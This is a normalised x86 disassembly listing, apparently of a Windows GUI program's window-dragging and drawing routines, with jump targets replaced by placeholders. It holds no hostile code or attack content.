mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_43f164
mov edx [ eax + 0x14 ]
mov eax esi
call sub_43d990
mov eax [ ebx + 0x14 ]
call sub_4030f8
mov eax edi
call sub_4030f8
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_43ebd0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_439dc0
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407a40
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_43d604
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_439d2c
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_43d604
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_43efec
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_43f164
xor edx edx
mov eax edi
call sub_43d990
sub_43ecac
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43d5dc
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402920
mov edx eax
mov eax ebx
call sub_43d604
sub_43ece8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_43ed53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404174
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ed5a
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43ed60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43ee0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43d36c
mov eax [ ebp - 0x8 ]
call sub_43ece8
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_43ed60
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ee16
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_43ed60
pop ecx
sub_43ee1c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43ef55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43ef04
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_439d2c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ef0b
mov eax [ ebp - 0x10 ]
call sub_4030f8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_43ece8
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_439d40
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_43ef0b
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_43ed60
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ef5c
lea eax [ ebp - 0x14 ]
call sub_403eb4
retn
sub_43ef64
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43d6b4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d6dc
call sub_43ef64
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d6b4
call sub_43ef64
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_43d0e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_43d5dc
mov edx eax
mov eax ebx
call sub_43d604
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43d604
jmp r-xdata
sub_43efec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_43ef64
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_43f030
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43d5dc
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_43d604
sub_43f060
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_43b290
mov edx eax
mov eax [ rw-data ]
call sub_43fbc0
mov eax [ ebx + 0x14 ]
call sub_43b290
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_43f174
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f0c0
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_43fbc0
mov eax ebx
call sub_43f174
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_43d604
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_43d604
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43efec
push ebx
push sub_43f164
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43d990
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_43f13c
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_439d2c
test eax eax
jle r-xdata
push ebx
push sub_43f164
xor edx edx
mov eax ebx
call sub_43d990
sub_43f174
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_43d1a8
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_43d1a8
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_43d214
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_43d214
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41d528
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_43f260
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43f260
pop ecx
mov eax ebx
call sub_43d5dc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d5dc
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43f260
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43d5dc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4225a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_43f2f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d5dc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43d160
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_43d5dc
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_43f260
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f340
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_434430
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434430
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_43f3bc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43d06c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_43d118
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_43d6c0
test eax eax
je r-xdata
mov eax esi
call sub_43d0e4
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43f164
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_43d990
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43d6c0
mov edx [ ebx + 0x20 ]
call sub_43d618
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_43f3bc
pop ecx
sub_43f43c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43d0c8
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_43d0c8
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_43d6c0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_43f43c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43f164
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_43d990
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_43d2c4
mov eax edi
call sub_43d6b4
test eax eax
je r-xdata
mov eax edi
call sub_43d6c0
mov esi eax
mov eax esi
call sub_43d5dc
push eax
mov eax esi
call sub_43d118
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_43d6b4
call sub_43d5dc
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_43d5dc
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_43d604
mov eax esi
call sub_43d5dc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43d604
mov eax edi
call sub_43d6c0
call sub_43d654
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_43d118
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43d604
mov eax edi
call sub_43d6b4
call sub_43d654
mov bl 0x1
jmp r-xdata
sub_43f574
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43d928
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412598
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e11c
test eax eax
je r-xdata
push ebp
call sub_43f3bc
pop ecx
push ebp
call sub_43f43c
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_43f340
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_43f5fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_43d1a8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_43d1a8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43f2f0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43f2f0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_43f68c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fa64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4067a0
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43e11c
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f0c0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067a0
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e11c
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4345d4
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fa6b
lea eax [ ebp - 0x48 ]
call sub_403eb4
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43b290
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4332f0
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4357a8
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403eb4
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_43f574
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_439dc0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f174
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4067a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_43f5fc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43f174
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067a0
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e11c
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_4349b0
jmp r-xdata
mov eax edi
call sub_450d28
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e11c
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434430
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_434a90
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f08
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f060
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452428
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43b290
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_435150
jmp r-xdata
sub_43fa74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403404
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_43fbe8
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_43fb04
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
